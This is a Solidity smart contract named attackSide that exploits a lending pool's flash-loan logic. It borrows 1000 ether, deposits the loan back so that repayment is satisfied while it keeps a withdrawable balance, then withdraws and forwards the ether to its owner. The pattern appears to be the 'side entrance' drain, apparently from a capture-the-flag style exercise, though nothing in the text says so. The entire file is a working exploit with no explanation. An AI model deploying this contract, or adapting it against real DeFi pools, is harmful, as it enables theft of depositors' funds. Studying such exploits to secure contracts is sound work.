pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external;
}

contract attackSide {
    IPool pool;
    address payable owner;
    bool called;

    constructor(address _pool) {
        pool = IPool(_pool);
        owner = payable(msg.sender);
    }

    function attack() external {
        pool.flashLoan(1000 ether);
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
        called = true;
    }

    function withdraw() external {
        pool.withdraw();
    }

    receive() external payable {
        (bool os, ) = payable(owner).call{value: address(this).balance}("");
        require(os);
    }
}
